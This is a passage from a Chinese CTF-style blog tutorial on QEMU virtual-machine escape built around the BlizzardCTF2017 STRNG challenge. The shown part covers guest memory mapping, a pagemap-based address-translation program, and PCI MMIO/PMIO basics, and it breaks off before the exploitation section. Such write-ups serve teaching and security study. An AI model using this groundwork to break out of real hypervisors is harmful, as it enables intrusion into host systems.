@@ -1,0 +1,1451 @@
+<!doctype html><html lang=zh-cn>
+<head>
+<meta charset=utf-8>
+<meta http-equiv=x-ua-compatible content="IE=edge,chrome=1">
+<title>Qemu Escape ---- 以BlizzardCTF2017_STRNG为例 - hhdx's blog</title>
+<meta name=renderer content="webkit">
+<meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1">
+<meta http-equiv=cache-control content="no-transform">
+<meta http-equiv=cache-control content="no-siteapp">
+<meta name=theme-color content="#f8f5ec">
+<meta name=msapplication-navbutton-color content="#f8f5ec">
+<meta name=apple-mobile-web-app-capable content="yes">
+<meta name=apple-mobile-web-app-status-bar-style content="#f8f5ec">
+<meta name=author content="hhdx"><meta name=description content="最近想学一下qemu escape的基础知识，进而分析一些Qemu的CVE漏洞。
+本文主要参考raycp师傅的两篇文章。[1] [2]
+Qemu概述 每个运行的qemu虚拟机对应于host上的一个进程，虚拟机的执行线程（如CPU线程、I/O线程等）对应于qemu进程中的一个线程。
+qemu的内存结构，根据QEMU Case Study，虚拟机对应的内存结构为如下：
+1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25  Guest&amp;#39; processes +--------------------+ Virtual addr space | | +--------------------+ | | \__ Page Table \__ \ \ | | Guest kernel +----+--------------------+----------------+ Guest&amp;#39;s phy. memory | | | | +----+--------------------+----------------+ | | \__ \__ \ \ | QEMU process | +----+------------------------------------------+ Virtual addr space | | | +----+------------------------------------------+ | | \__ Page Table \__ \ \ | | +----+-----------------------------------------------++ Physical memory | | || +----+-----------------------------------------------++   "><meta name=keywords content="C language,CTF,system engineer">
+<meta name=generator content="Hugo 0.87.0 with theme even">
+<link rel=canonical href=https://hhdx.xyz/post/qemu-pwn/>
+<link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png>
+<link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png>
+<link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png>
+<link rel=manifest href=/manifest.json>
+<link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5>
+<link href=/sass/main.min.0d3b8ec8ed7df891edf32830bfdc6af5976dc6b9ffeb7cd1d0cdd312bcf8e23e.css rel=stylesheet>
+<link rel=stylesheet href=https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.css integrity="sha256-7TyXnr2YU040zfSP+rEcz29ggW4j56/ujTPwjMzyqFY=" crossorigin=anonymous>
+<meta property="og:title" content="Qemu Escape ---- 以BlizzardCTF2017_STRNG为例">
+<meta property="og:description" content="最近想学一下qemu escape的基础知识，进而分析一些Qemu的CVE漏洞。
+本文主要参考raycp师傅的两篇文章。[1] [2]
+Qemu概述
+每个运行的qemu虚拟机对应于host上的一个进程，虚拟机的执行线程（如CPU线程、I/O线程等）对应于qemu进程中的一个线程。
+
+qemu的内存结构，根据QEMU Case Study，虚拟机对应的内存结构为如下：
+
+
+ 1
+ 2
+ 3
+ 4
+ 5
+ 6
+ 7
+ 8
+ 9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+
+
+                        Guest' processes
+                     +--------------------+
+Virtual addr space   |                    |
+                     +--------------------+
+                     |                    |
+                     \__   Page Table     \__
+                        \                    \
+                         |                    |  Guest kernel
+                    +----+--------------------+----------------+
+Guest's phy. memory |    |                    |                |
+                    +----+--------------------+----------------+
+                    |                                          |
+                    \__                                        \__
+                       \                                          \
+                        |             QEMU process                 |
+                   +----+------------------------------------------+
+Virtual addr space |    |                                          |
+                   +----+------------------------------------------+
+                   |                                               |
+                    \__                Page Table                   \__
+                       \                                               \
+                        |                                               |
+                   +----+-----------------------------------------------++
+Physical memory    |    |                                               ||
+                   +----+-----------------------------------------------++
+
+
+">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://hhdx.xyz/post/qemu-pwn/"><meta property="article:section" content="post">
+<meta property="article:published_time" content="2020-11-23T15:05:17+00:00">
+<meta property="article:modified_time" content="2020-11-23T15:05:17+00:00">
+<meta itemprop=name content="Qemu Escape ---- 以BlizzardCTF2017_STRNG为例">
+<meta itemprop=description content="最近想学一下qemu escape的基础知识，进而分析一些Qemu的CVE漏洞。
+本文主要参考raycp师傅的两篇文章。[1] [2]
+Qemu概述
+每个运行的qemu虚拟机对应于host上的一个进程，虚拟机的执行线程（如CPU线程、I/O线程等）对应于qemu进程中的一个线程。
+
+qemu的内存结构，根据QEMU Case Study，虚拟机对应的内存结构为如下：
+
+
+ 1
+ 2
+ 3
+ 4
+ 5
+ 6
+ 7
+ 8
+ 9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+
+
+                        Guest' processes
+                     +--------------------+
+Virtual addr space   |                    |
+                     +--------------------+
+                     |                    |
+                     \__   Page Table     \__
+                        \                    \
+                         |                    |  Guest kernel
+                    +----+--------------------+----------------+
+Guest's phy. memory |    |                    |                |
+                    +----+--------------------+----------------+
+                    |                                          |
+                    \__                                        \__
+                       \                                          \
+                        |             QEMU process                 |
+                   +----+------------------------------------------+
+Virtual addr space |    |                                          |
+                   +----+------------------------------------------+
+                   |                                               |
+                    \__                Page Table                   \__
+                       \                                               \
+                        |                                               |
+                   +----+-----------------------------------------------++
+Physical memory    |    |                                               ||
+                   +----+-----------------------------------------------++
+
+
+"><meta itemprop=datePublished content="2020-11-23T15:05:17+00:00">
+<meta itemprop=dateModified content="2020-11-23T15:05:17+00:00">
+<meta itemprop=wordCount content="5067">
+<meta itemprop=keywords content="CTF,Qemu,"><meta name=twitter:card content="summary">
+<meta name=twitter:title content="Qemu Escape ---- 以BlizzardCTF2017_STRNG为例">
+<meta name=twitter:description content="最近想学一下qemu escape的基础知识，进而分析一些Qemu的CVE漏洞。
+本文主要参考raycp师傅的两篇文章。[1] [2]
+Qemu概述
+每个运行的qemu虚拟机对应于host上的一个进程，虚拟机的执行线程（如CPU线程、I/O线程等）对应于qemu进程中的一个线程。
+
+qemu的内存结构，根据QEMU Case Study，虚拟机对应的内存结构为如下：
+
+
+ 1
+ 2
+ 3
+ 4
+ 5
+ 6
+ 7
+ 8
+ 9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+
+
+                        Guest' processes
+                     +--------------------+
+Virtual addr space   |                    |
+                     +--------------------+
+                     |                    |
+                     \__   Page Table     \__
+                        \                    \
+                         |                    |  Guest kernel
+                    +----+--------------------+----------------+
+Guest's phy. memory |    |                    |                |
+                    +----+--------------------+----------------+
+                    |                                          |
+                    \__                                        \__
+                       \                                          \
+                        |             QEMU process                 |
+                   +----+------------------------------------------+
+Virtual addr space |    |                                          |
+                   +----+------------------------------------------+
+                   |                                               |
+                    \__                Page Table                   \__
+                       \                                               \
+                        |                                               |
+                   +----+-----------------------------------------------++
+Physical memory    |    |                                               ||
+                   +----+-----------------------------------------------++
+
+
+"><!--[if lte IE 9]><script src=https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js></script><![endif]--><!--[if lt IE 9]><script src=https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js></script>
+<script src=https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js></script><![endif]-->
+</head>
+<body>
+<div id=mobile-navbar class=mobile-navbar>
+<div class=mobile-header-logo>
+<a href=/ class=logo>hhdx's blog</a>
+</div>
+<div class=mobile-navbar-icon>
+<span></span>
+<span></span>
+<span></span>
+</div>
+</div>
+<nav id=mobile-menu class="mobile-menu slideout-menu">
+<ul class=mobile-menu-list>
+<a href=/>
+<li class=mobile-menu-item>Home</li>
+</a><a href=/post/>
+<li class=mobile-menu-item>Archives</li>
+</a><a href=/tags/>
+<li class=mobile-menu-item>Tags</li>
+</a><a href=/links/>
+<li class=mobile-menu-item>Links</li>
+</a><a href=/about/>
+<li class=mobile-menu-item>About</li>
+</a>
+</ul>
+</nav>
+<div class=container id=mobile-panel>
+<header id=header class=header>
+<div class=logo-wrapper>
+<a href=/ class=logo>hhdx's blog</a>
+</div>
+<nav class=site-navbar>
+<ul id=menu class=menu>
+<li class=menu-item>
+<a class=menu-item-link href=/>Home</a>
+</li><li class=menu-item>
+<a class=menu-item-link href=/post/>Archives</a>
+</li><li class=menu-item>
+<a class=menu-item-link href=/tags/>Tags</a>
+</li><li class=menu-item>
+<a class=menu-item-link href=/links/>Links</a>
+</li><li class=menu-item>
+<a class=menu-item-link href=/about/>About</a>
+</li>
+</ul>
+</nav>
+</header>
+<main id=main class=main>
+<div class=content-wrapper>
+<div id=content class=content>
+<article class=post>
+<header class=post-header>
+<h1 class=post-title>Qemu Escape ---- 以BlizzardCTF2017_STRNG为例</h1>
+<div class=post-meta>
+<span class=post-time> 2020-11-23 </span>
+</div>
+</header>
+<div class=post-toc id=post-toc>
+<h2 class=post-toc-title>文章目录</h2>
+<div class="post-toc-content always-active">
+<nav id=TableOfContents>
+<ul>
+<li>
+<ul>
+<li><a href=#qemu概述>Qemu概述</a></li>
+<li><a href=#pci>PCI</a>
+<ul>
+<li><a href=#pci寻址>PCI寻址</a></li>
+<li><a href=#pci设备配置空间>PCI设备配置空间</a></li>
+</ul>
+</li>
+<li><a href=#qom>QOM</a></li>
+<li><a href=#blizzardctf2017-strng>BlizzardCTF2017-STRNG</a>
+<ul>
+<li><a href=#debugging>Debugging</a></li>
+<li><a href=#mmio>MMIO</a></li>
+<li><a href=#pmio>PMIO</a></li>
+<li><a href=#利用>利用</a></li>
+</ul>
+</li>
+<li><a href=#tips>tips</a></li>
+<li><a href=#后记>后记</a></li>
+<li><a href=#reference>Reference</a></li>
+</ul>
+</li>
+</ul>
+</nav>
+</div>
+</div>
+<div class=post-content>
+<p>最近想学一下qemu escape的基础知识，进而分析一些Qemu的CVE漏洞。</p>
+<p>本文主要参考raycp师傅的两篇文章。[1] [2]</p>
+<h2 id=qemu概述>Qemu概述</h2>
+<p>每个运行的qemu虚拟机对应于host上的一个进程，虚拟机的执行线程（如CPU线程、I/O线程等）对应于qemu进程中的一个线程。</p>
+<p><img src=https://raw.githubusercontent.com/clxsh/pics/master/imgqemu-architecture.png alt=qemu-architecture></p>
+<p>qemu的内存结构，根据<a href=http://www.phrack.org/papers/vm-escape-qemu-case-study.html>QEMU Case Study</a>，虚拟机对应的内存结构为如下：</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback>                        Guest&#39; processes
+                     +--------------------+
+Virtual addr space   |                    |
+                     +--------------------+
+                     |                    |
+                     \__   Page Table     \__
+                        \                    \
+                         |                    |  Guest kernel
+                    +----+--------------------+----------------+
+Guest&#39;s phy. memory |    |                    |                |
+                    +----+--------------------+----------------+
+                    |                                          |
+                    \__                                        \__
+                       \                                          \
+                        |             QEMU process                 |
+                   +----+------------------------------------------+
+Virtual addr space |    |                                          |
+                   +----+------------------------------------------+
+                   |                                               |
+                    \__                Page Table                   \__
+                       \                                               \
+                        |                                               |
+                   +----+-----------------------------------------------++
+Physical memory    |    |                                               ||
+                   +----+-----------------------------------------------++
+</code></pre></td></tr></table>
+</div>
+</div><p>qemu虚拟机进程会使用mmap分配出对应大小的内存空间，作为虚拟机的物理内存。</p>
+<p>以STRNG启动命令为例：</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=cp>#!/bin/sh
+</span><span class=cp></span>
+./qemu-system-x86_64 <span class=se>\
+</span><span class=se></span>    -m 1G <span class=se>\
+</span><span class=se></span>    -device strng <span class=se>\
+</span><span class=se></span>    -hda my-disk.img <span class=se>\
+</span><span class=se></span>    -hdb my-seed.img <span class=se>\
+</span><span class=se></span>    -nographic <span class=se>\
+</span><span class=se></span>    -L pc-bios/ <span class=se>\
+</span><span class=se></span>    -device e1000,netdev<span class=o>=</span>net0 <span class=se>\
+</span><span class=se></span>    -netdev user,id<span class=o>=</span>net0,hostfwd<span class=o>=</span>tcp::5555-:22
+</code></pre></td></tr></table>
+</div>
+</div><p>其使用-m参数指定虚拟机内存大小为1G，启动虚拟机后查看其maps。(sudo gdb, 然后attach pid)</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>...
+0x7fe71ab00000     0x7fe71ac00000 rw-p   <span class=m>100000</span> <span class=m>0</span>      
+0x7fe71ac00000     0x7fe71bc00000 rw-p  <span class=m>1000000</span> <span class=m>0</span>      
+0x7fe71bc00000     0x7fe71bc01000 ---p     <span class=m>1000</span> <span class=m>0</span>      
+0x7fe71bcff000     0x7fe71bd00000 ---p     <span class=m>1000</span> <span class=m>0</span>      
+0x7fe71bd00000     0x7fe71be00000 rw-p   <span class=m>100000</span> <span class=m>0</span>      
+0x7fe71be00000     0x7fe75be00000 rw-p <span class=m>40000000</span> <span class=m>0</span>    <span class=c1># mmap  </span>
+0x7fe75be00000     0x7fe75be01000 ---p     <span class=m>1000</span> <span class=m>0</span>      
+0x7fe75beff000     0x7fe75bf00000 ---p     <span class=m>1000</span> <span class=m>0</span>
+...
+</code></pre></td></tr></table>
+</div>
+</div><p>如何在qemu进程中找到虚拟机中分配的内存呢？</p>
+<p>首先将qemu虚拟机中的虚拟地址转化为物理地址，这个物理地址就是mmap空间的偏移，使用mmap基址加上这个偏移，就是对应的qemu进程空间地址中地址。</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span><span class=lnt>53
+</span><span class=lnt>54
+</span><span class=lnt>55
+</span><span class=lnt>56
+</span><span class=lnt>57
+</span><span class=lnt>58
+</span><span class=lnt>59
+</span><span class=lnt>60
+</span><span class=lnt>61
+</span><span class=lnt>62
+</span><span class=lnt>63
+</span><span class=lnt>64
+</span><span class=lnt>65
+</span><span class=lnt>66
+</span><span class=lnt>67
+</span><span class=lnt>68
+</span><span class=lnt>69
+</span><span class=lnt>70
+</span><span class=lnt>71
+</span><span class=lnt>72
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
+</span><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
+</span><span class=cp>#include</span> <span class=cpf>&lt;stdint.h&gt;</span><span class=cp>
+</span><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
+</span><span class=cp>#include</span> <span class=cpf>&lt;fcntl.h&gt;</span><span class=cp>
+</span><span class=cp>#include</span> <span class=cpf>&lt;assert.h&gt;</span><span class=cp>
+</span><span class=cp>#include</span> <span class=cpf>&lt;inttypes.h&gt;</span><span class=cp>
+</span><span class=cp></span>
+<span class=cp>#define PAGE_SHIFT  12
+</span><span class=cp>#define PAGE_SIZE   (1 &lt;&lt; PAGE_SHIFT)
+</span><span class=cp>#define PFN_PRESENT (1ull &lt;&lt; 63)
+</span><span class=cp>#define PFN_PFN     ((1ull &lt;&lt; 55) - 1)
+</span><span class=cp></span>
+<span class=kt>int</span> <span class=n>fd</span><span class=p>;</span>
+
+<span class=kt>uint32_t</span> <span class=nf>page_offset</span><span class=p>(</span><span class=kt>uint32_t</span> <span class=n>addr</span><span class=p>)</span>
+<span class=p>{</span>
+    <span class=k>return</span> <span class=n>addr</span> <span class=o>&amp;</span> <span class=p>((</span><span class=mi>1</span> <span class=o>&lt;&lt;</span> <span class=n>PAGE_SHIFT</span><span class=p>)</span> <span class=o>-</span> <span class=mi>1</span><span class=p>);</span>
+<span class=p>}</span>
+
+<span class=cm>/*
+</span><span class=cm>    /proc/pid/pagemap
+</span><span class=cm>    * Bits 0-54  page frame number (PFN) if present
+</span><span class=cm>    * Bits 0-4   swap type if swapped
+</span><span class=cm>    * Bits 5-54  swap offset if swapped
+</span><span class=cm>    * Bit  55    pte is soft-dirty (see Documentation/vm/soft-dirty.txt)
+</span><span class=cm>    * Bit  56    page exclusively mapped (since 4.2)
+</span><span class=cm>    * Bits 57-60 zero
+</span><span class=cm>    * Bit  61    page is file-page or shared-anon (since 3.5)
+</span><span class=cm>    * Bit  62    page swapped
+</span><span class=cm>    * Bit  63    page present
+</span><span class=cm>*/</span>
+<span class=kt>uint64_t</span> <span class=nf>gva_to_gfn</span><span class=p>(</span><span class=kt>void</span> <span class=o>*</span><span class=n>addr</span><span class=p>)</span>
+<span class=p>{</span>
+    <span class=kt>uint64_t</span> <span class=n>pme</span><span class=p>,</span> <span class=n>gfn</span><span class=p>;</span>
+    <span class=n>size_t</span> <span class=n>offset</span><span class=p>;</span>
+    <span class=n>offset</span> <span class=o>=</span> <span class=p>((</span><span class=n>uintptr_t</span><span class=p>)</span><span class=n>addr</span> <span class=o>&gt;&gt;</span> <span class=mi>9</span><span class=p>)</span> <span class=o>&amp;</span> <span class=o>~</span><span class=mi>7</span><span class=p>;</span>
+    <span class=n>lseek</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=n>offset</span><span class=p>,</span> <span class=n>SEEK_SET</span><span class=p>);</span>
+    <span class=n>read</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>pme</span><span class=p>,</span> <span class=mi>8</span><span class=p>);</span>        <span class=c1>// page frame num，指的是右移12位后的页号
+</span><span class=c1></span>    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=p>(</span><span class=n>pme</span> <span class=o>&amp;</span> <span class=n>PFN_PRESENT</span><span class=p>))</span>
+        <span class=k>return</span> <span class=o>-</span><span class=mi>1</span><span class=p>;</span>
+    <span class=n>gfn</span> <span class=o>=</span> <span class=n>pme</span> <span class=o>&amp;</span> <span class=n>PFN_PFN</span><span class=p>;</span>
+    <span class=k>return</span> <span class=n>gfn</span><span class=p>;</span>
+<span class=p>}</span>
+
+<span class=kt>uint64_t</span> <span class=nf>gva_to_gpa</span><span class=p>(</span><span class=kt>void</span> <span class=o>*</span><span class=n>addr</span><span class=p>)</span>
+<span class=p>{</span>
+    <span class=kt>uint64_t</span> <span class=n>gfn</span> <span class=o>=</span> <span class=n>gva_to_gfn</span><span class=p>(</span><span class=n>addr</span><span class=p>);</span>
+    <span class=n>assert</span><span class=p>(</span><span class=n>gfn</span> <span class=o>!=</span> <span class=o>-</span><span class=mi>1</span><span class=p>);</span>
+    <span class=k>return</span> <span class=p>(</span><span class=n>gfn</span> <span class=o>&lt;&lt;</span> <span class=n>PAGE_SHIFT</span><span class=p>)</span> <span class=o>|</span> <span class=n>page_offset</span><span class=p>((</span><span class=kt>uint64_t</span><span class=p>)</span><span class=n>addr</span><span class=p>);</span>
+<span class=p>}</span>
+
+<span class=kt>int</span> <span class=nf>main</span><span class=p>()</span>
+<span class=p>{</span>
+    <span class=kt>uint8_t</span> <span class=o>*</span><span class=n>ptr</span><span class=p>;</span>
+    <span class=kt>uint64_t</span> <span class=n>ptr_mem</span><span class=p>;</span>
+    
+    <span class=n>fd</span> <span class=o>=</span> <span class=n>open</span><span class=p>(</span><span class=s>&#34;/proc/self/pagemap&#34;</span><span class=p>,</span> <span class=n>O_RDONLY</span><span class=p>);</span>
+    <span class=k>if</span> <span class=p>(</span><span class=n>fd</span> <span class=o>&lt;</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
+        <span class=n>perror</span><span class=p>(</span><span class=s>&#34;open&#34;</span><span class=p>);</span>
+        <span class=n>exit</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span>
+    <span class=p>}</span>
+    
+    <span class=n>ptr</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>(</span><span class=mi>256</span><span class=p>);</span>
+    <span class=n>strcpy</span><span class=p>(</span><span class=n>ptr</span><span class=p>,</span> <span class=s>&#34;Where am I?&#34;</span><span class=p>);</span>
+    <span class=n>printf</span><span class=p>(</span><span class=s>&#34;%s</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>ptr</span><span class=p>);</span>
+    <span class=n>ptr_mem</span> <span class=o>=</span> <span class=n>gva_to_gpa</span><span class=p>(</span><span class=n>ptr</span><span class=p>);</span>
+    <span class=n>printf</span><span class=p>(</span><span class=s>&#34;Your physical address is at 0x%&#34;</span><span class=n>PRIx64</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>ptr_mem</span><span class=p>);</span>
+
+    <span class=n>getchar</span><span class=p>();</span>
+    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
+<span class=p>}</span>
+</code></pre></td></tr></table>
+</div>
+</div><h2 id=pci>PCI</h2>
+<p>PCI是Peripheral Component Interconnect（外围设备互联）的简称，是普遍使用在桌面及更大型的计算机上的外设总线。PCI架构被设计为ISA标准的替代品，它有三个主要目标：获得在计算机和外设之间传输数据时更好的性能；尽可能的平台无关；简化往系统中添加和 删除外设的工作。</p>
+<p>PCI是一种外设总线规范。我们先来看一下什么是总线：总线是一种传输信号的路径或信道。典型情况是，总线是连接于一个或多个导体的电气连线，总线上连接的所有设备可在同一时间收到所有的传输内容。总线由电气接口和编程接口组成。</p>
+<p>PCI总线主要有三部分：</p>
+<ol>
+<li>PCI 设备。符合 PCI 总线标准的设备就被称为 PCI 设备，PCI 总线架构中可以包含多个 PCI 设备。</li>
+<li>PCI 总线。PCI 总线在系统中可以有多条，类似于树状结构进行扩展，每条 PCI 总线都可以连接多个 PCI 设备/桥。</li>
+<li>PCI桥。当一条 PCI 总线的承载量不够时，可以用新的 PCI 总线进行扩展，而 PCI 桥则是连接 PCI 总线之间的纽带。</li>
+</ol>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>$ lspci
+00:00.0 Host bridge: Intel Corporation 440FX - 82441FX PMC <span class=o>[</span>Natoma<span class=o>]</span> <span class=o>(</span>rev 02<span class=o>)</span>
+00:01.0 ISA bridge: Intel Corporation 82371SB PIIX3 ISA <span class=o>[</span>Natoma/Triton II<span class=o>]</span>
+00:01.1 IDE interface: Intel Corporation 82371SB PIIX3 IDE <span class=o>[</span>Natoma/Triton II<span class=o>]</span>
+00:01.3 Bridge: Intel Corporation 82371AB/EB/MB PIIX4 ACPI <span class=o>(</span>rev 03<span class=o>)</span>
+00:02.0 VGA compatible controller: Device 1234:1111 <span class=o>(</span>rev 02<span class=o>)</span>
+00:03.0 Unclassified device <span class=o>[</span>00ff<span class=o>]</span>: Device 1234:11e9 <span class=o>(</span>rev 10<span class=o>)</span>
+00:04.0 Ethernet controller: Intel Corporation 82540EM Gigabit Ethernet Controller <span class=o>(</span>rev 03<span class=o>)</span>
+</code></pre></td></tr></table>
+</div>
+</div><h3 id=pci寻址>PCI寻址</h3>
+<p>直接来看一个具体的列子。<code>/proc/iomem</code>描述了系统内所有的设备在地址空间中的映射。(/proc/ioports描述了设备端口的映射)</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>$ lspci
+...
+00:03.0 Unclassified device <span class=o>[</span>00ff<span class=o>]</span>: Device 1234:11e9 <span class=o>(</span>rev 10<span class=o>)</span>
+...
+$ cat /proc/iomem
+...
+febf1000-febf10ff : 0000:00:03.0
+...
+</code></pre></td></tr></table>
+</div>
+</div><p>这是一个PCI设备，febf1000-febf10ff是它所映射的内存地址空间，占据了256bytes，0000:00:03.0则是这个PCI外设的地址，以冒号和点号分割成4部分，第一步16位表示域，第二个8位表示一个总线编号，第三个5位表示一个设备号，最后3位，表示功能号。</p>
+<p>PCI规范允许单个系统最多拥有256条总线，所以总线编号为8位。但对于大型系统来说，这是不够的，所以引入了域的概念，每个PCI域最多拥有256条总线，每条总线最多拥有32个设备，所以为5位，而每个设备最多可有8中功能，所以为3位。</p>
+<p>对于普通PC而言，一般只有一个域。</p>
+<h3 id=pci设备配置空间>PCI设备配置空间</h3>
+<p>PCI设备都有一个配置空间(PCI Configuration Space)，记录了该设备的详细信息。大小为256字节，其中前64字节是PCI标准规定的，并非所有字段必须填写，没用到的可以填充0。</p>
+<p><img src=https://raw.githubusercontent.com/clxsh/pics/master/imgPci-config-space.png alt=Pci-config-space></p>
+<p>其中的关键是BAR(Base Address Register)字段，记录了设备所需的地址空间及类型等属性。</p>
+<p>Memory Space BAR Layout</p>
+<table>
+<thead>
+<tr>
+<th>31 - 4</th>
+<th>3</th>
+<th>2 - 1</th>
+<th>0</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>16-Byte Aligned Base Address</td>
+<td>Prefetchable</td>
+<td>Type</td>
+<td>Always 0</td>
+</tr>
+</tbody>
+</table>
+<p>I/O Space BAR Layout</p>
+<table>
+<thead>
+<tr>
+<th>31 - 2</th>
+<th>1</th>
+<th>0</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>4-Byte Aligned Base Address</td>
+<td>Reserved</td>
+<td>Always 1</td>
+</tr>
+</tbody>
+</table>
+<p>地址空间的类型包括Memory Space和I/O Space。使用BAR的最低bit区分。</p>
+<p><strong>Memory Space</strong>，最低bit始终为0。type字段为0x00表示使用32bit地址，0x02表示使用64bit地址（64bit的BAR使用两个空间存储基址），0x01为PCI规范修订版3保留，早先版本使用bit1来支持低于1MB的地址空间。Prefetchable字段表示是否可以预取。</p>
+<p>BAR基址的计算：</p>
+<p>16bit&mdash;-BAR[x] & 0xFFF0；</p>
+<p>32bit&mdash;-BAR[x] & 0xFFFFFFF0；</p>
+<p>64bit&mdash;-(BAR[x] & 0xFFFFFFF0) + ((BAR[x+1] & 0xFFFFFFFF) &#171; 32)</p>
+<p><strong>I/O Space</strong>，最低bit为1，一般不支持预取。</p>
+<p>通过Memory Space访问设备I/O称为Memory-Mapped I/O(MMIO)，CPU直接使用普通的访存指令即可进行I/O。</p>
+<p>通过I/O Space访问设备I/O称为Port I/O或者Port-Mapped I/O(PMIO)，这种情况下CPU使用专门的I/O指令（如<code>IN/OUT</code>）访问I/O端口。</p>
+<p>可以通过查看<code>resource</code>文件，获得其MMIO和PMIO的地址/端口等信息。同一文件夹下面还有resource0和resource1文件，resource0对应mmio空间，resource1对应pmio空间。</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
